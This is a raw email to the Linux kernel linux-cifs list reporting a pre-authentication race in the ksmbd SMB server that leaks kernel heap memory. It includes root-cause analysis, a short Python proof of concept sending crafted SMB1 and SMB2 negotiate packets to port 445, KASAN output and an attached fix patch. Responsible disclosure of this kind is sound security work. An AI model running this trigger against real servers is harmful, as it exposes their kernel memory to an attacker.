Received: from mail-ed2-f16.google.com (mail-ed2-f16.google.com [74.125.228.80])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id CAB46239068
	for <linux-cifs@vger.kernel.org>; Sun, 27 Sep 2026 14:27:11 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=74.125.228.80
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790519234; cv=pass; b=cNUxGzCV1w2gt36aOVWpYVTeAm0kghIRR3/FuBSHqAmP2Di5VN5y8lJwzIpx73W6DRHuC3NGAn4UReiOwsoIRpDKZA7q9WtlC9Ylcd7G+PMggTug9IzLMOLbX3jbWNq4jWYdhHvuDXhr9Fy86jDMh9S/Di9NgCEPRoy8pLdr2Ww=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790519234; c=relaxed/simple;
	bh=8kD1gDcCFs+lnbyIMjROqxGpuXdNwH0unV/pPVNpe0Y=;
	h=MIME-Version:From:Date:Message-ID:Subject:To:Content-Type; b=FKkPDqb5nR+l+RYOsBrS6igRlhLs2rh7CJZ35f5OIy0lFoMdab2zdcxhmdpm7tdPOgR0kT1vjbqRFWtOhAurjlX9JSIGHV45XWqrT8V+Q6G996lKz9VHLb2miDoziwhZowu7w1DL1xGCwF0G9GKL9P8wjQAoEWiBPzOAaYeas7Y=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=Zd7sMjBy; arc=pass smtp.client-ip=74.125.228.80
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="Zd7sMjBy"
Received: by mail-ed2-f16.google.com with SMTP id 4fb4d7f45d1cf-6a9984f9adcso3632969a12.0
        for <linux-cifs@vger.kernel.org>; Sun, 27 Sep 2026 07:27:11 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1790519229; cv=none;
        d=google.com; s=arc-20260327;
        b=SZZa0dh80Zj6d3EwajV1pBvga/8lmTWdBkc+Wk4VJDp68qQ93cvP6xSNcErnT40MBk
         DE20aqDKa8/L0W9A4zwJdVP5PY+u6wi24+3roDoW4ad0U6s2gPnrmoxa5mKC8+M68PSo
         EAwNYFsp0iwi5agvOW9a2Hkq8rfPqfYb1D7fEwq1fNJB5n0QQxg0YkrQaNKPlILbiioQ
         JvCow77mFN3XszFaKtmPJL87bO98JlL18CEdkwQDhG18vRNZugVN4On5EFyufeEO2rIf
         ccOHHByVUwEYODzo8XjZTRWSxJbypa91I+dr4v5zrSVI+XVO2808n5P1AMS8Kg9jhmQP
         ZGvw==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=to:subject:message-id:date:from:mime-version:dkim-signature;
        bh=TXOcvTTCnikbQFkZ+keGc8UJOXBHqKOXr/o3ZAp//zE=;
        fh=8niZwYNqcNR5vJMSF+Piu7eYrfoBi4jpjjKVLykIjtE=;
        b=PYDFn+KbwZG/YvUD5Zmeze/zZUt5uFCh6BQksf7cmscVArghEt9Z5OqqKwNmXevt12
         FcVh+ZeN+yFgFYvaTCmxnfVfKd07EpYLLoP4rXsL8Q3lJy06Tf1zQyJBk7HgTHbFHin9
         LEBIG1xnQwVdIJiDb7qQxid1j90aNziCebkmdDITgW35hLrPlFt/X0ACZeN1jS4Iu+N0
         oJPS395GB/PWpbqVTO/oZYNlX2zaEx6eBEF8lyANKzeOiNdEvDHbZ38z05tlimpHWe/B
         z57Hf/b+0knmjxlUvYRTSA3Fml6zUUGGKOPlkkE5lgszD3pCWhxLvpjQbE4+u2z7QzsZ
         4otQ==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1790519229; x=1791124029; darn=vger.kernel.org;
        h=content-type:to:subject:message-id:date:from:mime-version:from:to
         :cc:subject:date:message-id:reply-to:content-type;
        bh=TXOcvTTCnikbQFkZ+keGc8UJOXBHqKOXr/o3ZAp//zE=;
        b=Zd7sMjByjczjIBLj2CRl2AREwVKmrG+cHxjKjUaYnIzQdmk2QrnCKcKO/2DD9oUJjH
         Ymt9XXFsZE4lpcVAaKhBXreC6UsHb3SLxKquh+2RfLqQXjZQH6DKC6rzaYo9cF3KAfmf
         nGsuT8dETIqML+syBKINwSRQnNznk9Y+9Azs7sNz/6wndfDbkIe+V67Hpw26tpG7+p4x
         X6bMTsTQ2sDuON83NsAiNSK0rj755HjoN+MVui6txG2DAmnVPP/+v2C+Z1ER1nmJA8Bv
         wfjf+MoaajmgSfC7tpNi9+r997X5EBDh0zKC72fLmC/sofqvuVuVMnKLGWRBN2dt50py
         X4Ew==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790519229; x=1791124029;
        h=content-type:to:subject:message-id:date:from:mime-version:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=TXOcvTTCnikbQFkZ+keGc8UJOXBHqKOXr/o3ZAp//zE=;
        b=AhcPG2FqcDFMwhEmWBS/QwVP9AmVgiSyusNR8ufd4eoWMh7OUeV/Aqk8xCsvP7ubWS
         HqdUh9o0mcwhtIwBAldCEBGHInQ1u1taDKUzQPHCOv+FZZcNChrO22/UeeVaywLT35YH
         D7YCECewos/NheYxj1wLEGBBOF/AAAJqJRM4tQL6rCamrVbB1IwNhWUt5Grou4bGGTJg
         0mTZFzj3jykCxNwl6jI0BFYiPZxSnF0F+MdeNO5hPXrRM1/ZJ36/3Yeqajvj6N92nRRF
         jbAiSroiSm/VAFLN+Js7tqVw9ke/I09rkuejoe8z3Iyd+DRKlxBESDDlw40/gblyy9Rj
         mpEw==
X-Gm-Message-State: AFq9FYKDFh5g0sQAODWq4xVuCX7LTYnXFDEt3JnYF35OxVMlDsxDvQOT
	/e/FhBDUPno/qpl/i02MNaOFSeO8G5Xrt2TkLBJ8eKKirllKcbpCvAUnQmJ2wZAKYzmJ/Q4KOGN
	0MF7D1R0yhetPdu9OgN1nWNT62GB/1H9QAatN
X-Gm-Gg: AYBFou2CBAYykro5vif0BZcyYeu5yQ8ot3ljLj018UrAz02GmNMVVgphCrX7Uuel0gL
	cDdTvsyj9vDMBZ38eKUZVwWO9GFrGS+7yCHWRBMNoV6KCQp9JfCwlTp0UsFPHr/bdaOTqdJXiBa
	tqzS6+ScXrM9JusPxIpwv8PZOXSB4g/b0ravb6NLgfsP2GtA5sJDROlJkpppWAY5UxGNW2knZ0W
	letZQt5txsFTdb8776DG1fldxP2gvm+HDgM63zHYlwxVuS//a3WQYpTeGZ7r9v/7Sy8kaTsy1JJ
	KdXLRVejGIIiT4yhbeKFwS3RzqEhubRIc36M0PNvonksHqpWtfA/jA==
X-Received: by 2002:a05:6402:a0c9:b0:6a6:1a05:8b27 with SMTP id
 4fb4d7f45d1cf-6aac8f234b4mr8283016a12.8.1790519228854; Sun, 27 Sep 2026
 07:27:08 -0700 (PDT)
Precedence: bulk
X-Mailing-List: linux-cifs@vger.kernel.org
List-Id: <linux-cifs.vger.kernel.org>
List-Subscribe: <mailto:linux-cifs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-cifs+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
From: =?UTF-8?B?66CI65Oc7YyA7ZWY6rOg7Iu27Ja07JqU?= <ihopenre@gmail.com>
Date: Sun, 27 Sep 2026 21:26:54 +0700
X-Gm-Features: AclHuK-M_Yv4Q5UbT5Ks6N1z2FMnkw0u6nvrQF56Q6QCqmypjwTUBdjqTwN4x-Y
Message-ID: <CANTrAmy-2tA9B_mY-hARC5LE_==6m+52Pq1p0EV6fRXgWtyGQg@mail.gmail.com>
Subject: pre-auth remote kernel heap info-leak via conn->ops TOCTOU
To: linux-cifs@vger.kernel.org, linkinjeon@kernel.org
Content-Type: multipart/mixed; boundary="00000000000099a674065c77be4b"

--00000000000099a674065c77be4b
Content-Type: multipart/alternative; boundary="00000000000099a672065c77be49"

--00000000000099a672065c77be49
Content-Type: text/plain; charset="UTF-8"

Hi Namjae,

I found a TOCTOU race condition in ksmbd that allows an unauthenticated
remote attacker to leak 23 bytes of kernel heap data per connection.

*Summary*

ksmbd_init_smb_server() in fs/smb/server/smb_common.c sets conn->ops
based on the protocol identifier of each incoming request. The guard
variable conn->need_neg is only cleared asynchronously by the kworker in
smb2_handle_negotiate() (fs/smb/server/smb2pdu.c:1852). When an attacker
sends two requests back-to-back on one TCP connection before the kworker
processes the first, the second request overwrites conn->ops, causing
protocol confusion.

*Root Cause*

The connection handler thread calls ksmbd_init_smb_server() for each
request in its receive loop (connection.c, ksmbd_conn_handler_loop).
Each call checks conn->need_neg; if true, it sets conn->ops to either
smb1_server_ops or smb3_11_server_ops depending on the protocol
identifier. Critically, init_smb3_11_server() does NOT clear
conn->need_neg (only smb2_handle_negotiate does, line 1852 of
smb2pdu.c), so every request that arrives before the negotiate kworker
runs will re-enter this branch and overwrite conn->ops.

The race window is large: SMB2_MAX_CREDITS (8192) concurrent requests
are allowed by default.

*Exploit Scenario*

1. Attacker sends [SMB1 NEGOTIATE (40 bytes)] + [SMB2 NEGOTIATE (>=66
   bytes)] in a single TCP segment on one connection.

2. Connection handler processes request A (SMB1):
   - ksmbd_init_smb_server() sees need_neg==true, proto==SMB1
   - Sets conn->ops = smb1_server_ops
   - Allocates kmalloc-64 for the 40-byte PDU (+4 RFC1002 +1 = 45 bytes)
   - Queues work A to kworker

3. Connection handler processes request B (SMB2), before kworker runs:
   - ksmbd_init_smb_server() still sees need_neg==true, proto==SMB2
   - Overwrites conn->ops = smb3_11_server_ops

4. kworker picks up work A:
   - Calls conn->ops->init_rsp_hdr(work), which is now init_smb2_rsp_hdr
   - init_smb2_rsp_hdr reads struct smb2_hdr (64 bytes) from a 40-byte
     request buffer:
     - SessionId at offset 40 (8 bytes): 3 bytes in-bounds + 5 OOB
     - Signature at offset 48 (16 bytes): entirely OOB, 2 past alloc end
   - Total: 23 bytes read from adjacent kmalloc-64 slab objects
   - These bytes are copied into the response header and sent to the
     attacker over the network

*Impact*

- Pre-authentication: no credentials required, just a TCP connection to
  port 445
- Information disclosure: 23 bytes of adjacent kernel slab data per
  connection, repeatable
- Potential for KASLR bypass or credential recovery depending on what
  occupies adjacent kmalloc-64 objects
- CWE-362 (Race Condition), CWE-125 (Out-of-bounds Read)

*CVSS*

CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (8.7 High)

Without KASAN the OOB read is silent (no crash); with KASAN enabled it
triggers a panic. Production kernels do not typically run KASAN, so the
primary impact is data leakage, not denial of service.

*Affected Versions*

Confirmed on Linux 7.3-rc2 (commit df2908090). The vulnerable code
pattern (need_neg cleared only in smb2_handle_negotiate, not in
ksmbd_init_smb_server) appears present since ksmbd's initial merge.

*Reproduction*

Environment: QEMU/KVM guest running KASAN-enabled 7.3-rc2 kernel with
ksmbd configured (port 445), host forwarding 10445 to guest 445.

PoC (Python 3, single script):

    import socket, struct, time

    def nbss(body):
        return struct.pack(">I", len(body)) + body

    def smb1_neg():
        buf = bytearray(40)
        buf[0:4] = b"\xffSMB"
        buf[4] = 0x72
        return bytes(buf)

    def smb2_neg():
        hdr = struct.pack("<4sHHIHHIIQ8sQ16s",
            b"\xfeSMB", 64, 0, 0, 0, 31, 0, 0, 0,
            b"\x00"*8, 0, b"\x00"*16)
        body = struct.pack("<HHHHI16sIHH",
            36, 2, 1, 0, 0x7f, b"\x00"*16, 0, 0, 0)
        return hdr + body + struct.pack("<HH", 0x0311, 0x0300)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("TARGET_IP", 445))
    s.sendall(nbss(smb1_neg()) + nbss(smb2_neg()))
    time.sleep(0.3)
    # Check dmesg/serial for KASAN slab-out-of-bounds in init_smb2_rsp_hdr

KASAN output (abbreviated):

    BUG: KASAN: slab-out-of-bounds in init_smb2_rsp_hdr+0x640/0x720
    Read of size 8 at addr ffff88800f60c5ac by task kworker/0:0/29466
    Workqueue: ksmbd-io handle_ksmbd_work

*Proposed Fix*

Patch attached. Two changes:

1. Set conn->need_neg = false in ksmbd_init_smb_server() before calling
   init_smb1_server()/init_smb3_11_server(), preventing a second request
   from re-entering the negotiation setup path.

2. Add a buffer size check in init_smb2_rsp_hdr() as defense in depth.

Please assign a CVE via the kernel.org CNA.

Regards,
ihopenre-eng
Github : ihopenre-eng

--00000000000099a672065c77be49
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

<div dir=3D"ltr">Hi Namjae,<br><br>I found a TOCTOU race condition in ksmbd=
 that allows an unauthenticated<br>remote attacker to leak 23 bytes of kern=
el heap data per connection.<br><br><b>Summary</b><br><br>ksmbd_init_smb_se=
rver() in fs/smb/server/smb_common.c sets conn-&gt;ops<br>based on the prot=
ocol identifier of each incoming request. The guard<br>variable conn-&gt;ne=
ed_neg is only cleared asynchronously by the kworker in<br>smb2_handle_nego=
tiate() (fs/smb/server/smb2pdu.c:1852). When an attacker<br>sends two reque=
sts back-to-back on one TCP connection before the kworker<br>processes the =
first, the second request overwrites conn-&gt;ops, causing<br>protocol conf=
usion.<br><br><b>Root Cause</b><br><br>The connection handler thread calls =
ksmbd_init_smb_server() for each<br>request in its receive loop (connection=
.c, ksmbd_conn_handler_loop).<br>Each call checks conn-&gt;need_neg; if tru=
e, it sets conn-&gt;ops to either<br>smb1_server_ops or smb3_11_server_ops =
depending on the protocol<br>identifier. Critically, init_smb3_11_server() =
does NOT clear<br>conn-&gt;need_neg (only smb2_handle_negotiate does, line =
1852 of<br>smb2pdu.c), so every request that arrives before the negotiate k=
worker<br>runs will re-enter this branch and overwrite conn-&gt;ops.<br><br=
>The race window is large: SMB2_MAX_CREDITS (8192) concurrent requests<br>a=
re allowed by default.<br><br><b>Exploit Scenario</b><br><br>1. Attacker se=
nds [SMB1 NEGOTIATE (40 bytes)] + [SMB2 NEGOTIATE (&gt;=3D66<br>=C2=A0 =C2=
=A0bytes)] in a single TCP segment on one connection.<br><br>2. Connection =
handler processes request A (SMB1):<br>=C2=A0 =C2=A0- ksmbd_init_smb_server=
() sees need_neg=3D=3Dtrue, proto=3D=3DSMB1<br>=C2=A0 =C2=A0- Sets conn-&gt=
;ops =3D smb1_server_ops<br>=C2=A0 =C2=A0- Allocates kmalloc-64 for the 40-=
byte PDU (+4 RFC1002 +1 =3D 45 bytes)<br>=C2=A0 =C2=A0- Queues work A to kw=
orker<br><br>3. Connection handler processes request B (SMB2), before kwork=
er runs:<br>=C2=A0 =C2=A0- ksmbd_init_smb_server() still sees need_neg=3D=
=3Dtrue, proto=3D=3DSMB2<br>=C2=A0 =C2=A0- Overwrites conn-&gt;ops =3D smb3=
_11_server_ops<br><br>4. kworker picks up work A:<br>=C2=A0 =C2=A0- Calls c=
onn-&gt;ops-&gt;init_rsp_hdr(work), which is now init_smb2_rsp_hdr<br>=C2=
=A0 =C2=A0- init_smb2_rsp_hdr reads struct smb2_hdr (64 bytes) from a 40-by=
te<br>=C2=A0 =C2=A0 =C2=A0request buffer:<br>=C2=A0 =C2=A0 =C2=A0- SessionI=
d at offset 40 (8 bytes): 3 bytes in-bounds + 5 OOB<br>=C2=A0 =C2=A0 =C2=A0=
- Signature at offset 48 (16 bytes): entirely OOB, 2 past alloc end<br>=C2=
=A0 =C2=A0- Total: 23 bytes read from adjacent kmalloc-64 slab objects<br>=
=C2=A0 =C2=A0- These bytes are copied into the response header and sent to =
the<br>=C2=A0 =C2=A0 =C2=A0attacker over the network<br><br><b>Impact</b><b=
r><br>- Pre-authentication: no credentials required, just a TCP connection =
to<br>=C2=A0 port 445<br>- Information disclosure: 23 bytes of adjacent ker=
nel slab data per<br>=C2=A0 connection, repeatable<br>- Potential for KASLR=
 bypass or credential recovery depending on what<br>=C2=A0 occupies adjacen=
t kmalloc-64 objects<br>- CWE-362 (Race Condition), CWE-125 (Out-of-bounds =
Read)<br><br><b>CVSS</b><br><br>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N=
/VA:N/SC:N/SI:N/SA:N (8.7 High)<br><br>Without KASAN the OOB read is silent=
 (no crash); with KASAN enabled it<br>triggers a panic. Production kernels =
do not typically run KASAN, so the<br>primary impact is data leakage, not d=
enial of service.<br><br><b>Affected Versions</b><br><br>Confirmed on Linux=
 7.3-rc2 (commit df2908090). The vulnerable code<br>pattern (need_neg clear=
ed only in smb2_handle_negotiate, not in<br>ksmbd_init_smb_server) appears =
present since ksmbd&#39;s initial merge.<br><br><b>Reproduction</b><br><br>=
Environment: QEMU/KVM guest running KASAN-enabled 7.3-rc2 kernel with<br>ks=
mbd configured (port 445), host forwarding 10445 to guest 445.<br><br>PoC (=
Python 3, single script):<br><br>=C2=A0 =C2=A0 import socket, struct, time<=
br><br>=C2=A0 =C2=A0 def nbss(body):<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 return =
struct.pack(&quot;&gt;I&quot;, len(body)) + body<br><br>=C2=A0 =C2=A0 def s=
mb1_neg():<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 buf =3D bytearray(40)<br>=C2=A0 =
=C2=A0 =C2=A0 =C2=A0 buf[0:4] =3D b&quot;\xffSMB&quot;<br>=C2=A0 =C2=A0 =C2=
=A0 =C2=A0 buf[4] =3D 0x72<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 return bytes(buf)=
<br><br>=C2=A0 =C2=A0 def smb2_neg():<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 hdr =
=3D struct.pack(&quot;&lt;4sHHIHHIIQ8sQ16s&quot;,<br>=C2=A0 =C2=A0 =C2=A0 =
=C2=A0 =C2=A0 =C2=A0 b&quot;\xfeSMB&quot;, 64, 0, 0, 0, 31, 0, 0, 0,<br>=C2=
=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 b&quot;\x00&quot;*8, 0, b&quot;\x00&=
quot;*16)<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 body =3D struct.pack(&quot;&lt;HHH=
HI16sIHH&quot;,<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 36, 2, 1, 0, 0=
x7f, b&quot;\x00&quot;*16, 0, 0, 0)<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 return h=
dr + body + struct.pack(&quot;&lt;HH&quot;, 0x0311, 0x0300)<br><br>=C2=A0 =
=C2=A0 s =3D socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>=C2=A0 =
=C2=A0 s.connect((&quot;TARGET_IP&quot;, 445))<br>=C2=A0 =C2=A0 s.sendall(n=
bss(smb1_neg()) + nbss(smb2_neg()))<br>=C2=A0 =C2=A0 time.sleep(0.3)<br>=C2=
=A0 =C2=A0 # Check dmesg/serial for KASAN slab-out-of-bounds in init_smb2_r=
sp_hdr<br><br>KASAN output (abbreviated):<br><br>=C2=A0 =C2=A0 BUG: KASAN: =
slab-out-of-bounds in init_smb2_rsp_hdr+0x640/0x720<br>=C2=A0 =C2=A0 Read o=
f size 8 at addr ffff88800f60c5ac by task kworker/0:0/29466<br>=C2=A0 =C2=
=A0 Workqueue: ksmbd-io handle_ksmbd_work<br><br><b>Proposed Fix</b><br><br=
>Patch attached. Two changes:<br><br>1. Set conn-&gt;need_neg =3D false in =
ksmbd_init_smb_server() before calling<br>=C2=A0 =C2=A0init_smb1_server()/i=
nit_smb3_11_server(), preventing a second request<br>=C2=A0 =C2=A0from re-e=
ntering the negotiation setup path.<br><br>2. Add a buffer size check in in=
it_smb2_rsp_hdr() as defense in depth.<br><br>Please assign a CVE via the <=
a href=3D"http://kernel.org">kernel.org</a> CNA.<br><br>Regards,<br>ihopenr=
e-eng<br><div>Github :=C2=A0<span style=3D"background-color:transparent">ih=
openre-eng</span></div></div>

--00000000000099a672065c77be49--
--00000000000099a674065c77be4b
Content-Type: application/octet-stream; 
	name="0001-ksmbd-fix-conn-ops-race.patch"
Content-Disposition: attachment; 
	filename="0001-ksmbd-fix-conn-ops-race.patch"
Content-Transfer-Encoding: base64
Content-ID: <f_mujwutoi0>
X-Attachment-Id: f_mujwutoi0

RnJvbTogaWhvcGVucmUtZW5nIDwyNDcwNzIxNTEraWhvcGVucmUtZW5nQHVzZXJzLm5vcmVwbHku
Z2l0aHViLmNvbT4KU3ViamVjdDogW1BBVENIXSBrc21iZDogZml4IGNvbm4tPm9wcyByYWNlIGlu
IGtzbWJkX2luaXRfc21iX3NlcnZlcgoKa3NtYmRfaW5pdF9zbWJfc2VydmVyKCkgc2V0cyBjb25u
LT5vcHMgZm9yIGVhY2ggaW5jb21pbmcgcmVxdWVzdCBiYXNlZApvbiB0aGUgcHJvdG9jb2wgaWRl
bnRpZmllciwgYnV0IGNvbm4tPm5lZWRfbmVnIGlzIG9ubHkgY2xlYXJlZCBsYXRlciBieQp0aGUg
a3dvcmtlcidzIHNtYjJfaGFuZGxlX25lZ290aWF0ZSgpLiBXaGVuIHR3byByZXF1ZXN0cyBhcnJp
dmUgb24gdGhlCnNhbWUgVENQIGNvbm5lY3Rpb24gYmVmb3JlIHRoZSBrd29ya2VyIHByb2Nlc3Nl
cyB0aGUgZmlyc3QsIGJvdGggZW50ZXIKdGhlIG5lZWRfbmVnPT10cnVlIGJyYW5jaCBhbmQgb3Zl
cndyaXRlIGNvbm4tPm9wcyB3aXRob3V0IGFueQpzeW5jaHJvbml6YXRpb246CgogIDEuIFJlcXVl
c3QgQSAoU01CMSwgcGR1X3NpemU9NDApIHNldHMgY29ubi0+b3BzID0gc21iMV9zZXJ2ZXJfb3Bz
CiAgMi4gUmVxdWVzdCBCIChTTUIyLCBwZHVfc2l6ZT49NjYpIG92ZXJ3cml0ZXMgY29ubi0+b3Bz
ID0gc21iM18xMV9zZXJ2ZXJfb3BzCiAgMy4ga3dvcmtlciBwcm9jZXNzZXMgd29yayBBIHdpdGgg
dGhlIG92ZXJ3cml0dGVuIHNtYjNfMTEgb3BzCiAgNC4gaW5pdF9zbWIyX3JzcF9oZHIoKSByZWFk
cyBhIDY0LWJ5dGUgc21iMl9oZHIgZnJvbSBhIDQwLWJ5dGUgYnVmZmVyCgpLQVNBTiByZXBvcnRz
IGEgMjMtYnl0ZSBzbGFiLW91dC1vZi1ib3VuZHMgcmVhZCBpbiBpbml0X3NtYjJfcnNwX2hkcgoo
U2Vzc2lvbklkIGF0IG9mZnNldCA0MCBhbmQgU2lnbmF0dXJlIGF0IG9mZnNldCA0OCkuIFRoZSBs
ZWFrZWQgc2xhYgpkYXRhIGlzIGNvcGllZCBpbnRvIHRoZSByZXNwb25zZSBoZWFkZXIgYW5kIHNl
bnQgYmFjayB0byB0aGUgY2xpZW50LgoKRml4IGJ5IGNsZWFyaW5nIGNvbm4tPm5lZWRfbmVnIGlu
IGtzbWJkX2luaXRfc21iX3NlcnZlcigpIGJlZm9yZQpzZXR0aW5nIGNvbm4tPm9wcywgc28gb25s
eSB0aGUgZmlyc3QgcmVxdWVzdCBvbiBhIGNvbm5lY3Rpb24gY2FuIGVudGVyCnRoZSBuZWdvdGlh
dGlvbiBzZXR1cCBwYXRoLiBBZGQgYSBkZWZlbnNpdmUgc2l6ZSBjaGVjayBpbgppbml0X3NtYjJf
cnNwX2hkcigpIGFzIHdlbGwuCgpTaWduZWQtb2ZmLWJ5OiBpaG9wZW5yZS1lbmcgPDI0NzA3MjE1
MStpaG9wZW5yZS1lbmdAdXNlcnMubm9yZXBseS5naXRodWIuY29tPgotLS0KIGZzL3NtYi9zZXJ2
ZXIvc21iMnBkdS5jICAgIHwgMyArKysKIGZzL3NtYi9zZXJ2ZXIvc21iX2NvbW1vbi5jIHwgMiAr
KwogMiBmaWxlcyBjaGFuZ2VkLCA1IGluc2VydGlvbnMoKykKCmRpZmYgLS1naXQgYS9mcy9zbWIv
c2VydmVyL3NtYl9jb21tb24uYyBiL2ZzL3NtYi9zZXJ2ZXIvc21iX2NvbW1vbi5jCi0tLSBhL2Zz
L3NtYi9zZXJ2ZXIvc21iX2NvbW1vbi5jCisrKyBiL2ZzL3NtYi9zZXJ2ZXIvc21iX2NvbW1vbi5j
CkBAIC00NTMsNiArNDUzLDggQEAgaW50IGtzbWJkX2luaXRfc21iX3NlcnZlcihzdHJ1Y3Qga3Nt
YmRfY29ubiAqY29ubikKIAkJcmV0dXJuIDA7CiAJfQoKKwljb25uLT5uZWVkX25lZyA9IGZhbHNl
OworCiAJaWYgKHByb3RvID09IFNNQjFfUFJPVE9fTlVNQkVSKQogCQlyZXR1cm4gaW5pdF9zbWIx
X3NlcnZlcihjb25uKTsKIAlyZXR1cm4gaW5pdF9zbWIzXzExX3NlcnZlcihjb25uKTsKZGlmZiAt
LWdpdCBhL2ZzL3NtYi9zZXJ2ZXIvc21iMnBkdS5jIGIvZnMvc21iL3NlcnZlci9zbWIycGR1LmMK
LS0tIGEvZnMvc21iL3NlcnZlci9zbWIycGR1LmMKKysrIGIvZnMvc21iL3NlcnZlci9zbWIycGR1
LmMKQEAgLTY0NCw2ICs2NDQsOSBAQCBpbnQgaW5pdF9zbWIyX3JzcF9oZHIoc3RydWN0IGtzbWJk
X3dvcmsgKndvcmspCiAJc3RydWN0IHNtYjJfaGRyICpyc3BfaGRyID0gc21iX2dldF9tc2cod29y
ay0+cmVzcG9uc2VfYnVmKTsKIAlzdHJ1Y3Qgc21iMl9oZHIgKnJjdl9oZHIgPSBzbWJfZ2V0X21z
Zyh3b3JrLT5yZXF1ZXN0X2J1Zik7CgorCWlmIChnZXRfcmZjMTAwMl9sZW4od29yay0+cmVxdWVz
dF9idWYpIDwgc2l6ZW9mKHN0cnVjdCBzbWIyX2hkcikpCisJCXJldHVybiAtRUlOVkFMOworCiAJ
bWVtc2V0KHJzcF9oZHIsIDAsIHNpemVvZihzdHJ1Y3Qgc21iMl9oZHIpICsgMik7CiAJcnNwX2hk
ci0+UHJvdG9jb2xJZCA9IHJjdl9oZHItPlByb3RvY29sSWQ7CiAJcnNwX2hkci0+U3RydWN0dXJl
U2l6ZSA9IFNNQjJfSEVBREVSX1NUUlVDVFVSRV9TSVpFOwo=
--00000000000099a674065c77be4b--
